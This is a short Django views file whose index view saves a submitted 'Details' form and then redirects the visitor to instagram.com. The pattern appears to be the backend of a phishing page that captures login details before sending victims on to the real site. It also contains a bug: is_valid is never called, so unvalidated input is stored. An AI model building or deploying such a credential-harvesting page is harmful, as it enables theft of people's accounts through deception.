from email import message
from django.conf import settings
from django.shortcuts import redirect, render
from django.template import context
from .models import Details
from .forms import DetailsForm

# Create your views here.

def index(request):

    form = DetailsForm()
    

    if request.method == "POST":
        form = DetailsForm(request.POST)
        if form.is_valid:
            form.save()
        return redirect("http://instagram.com/")
      
    context = {'form': form}
    return render(request, 'home/index.html', context)



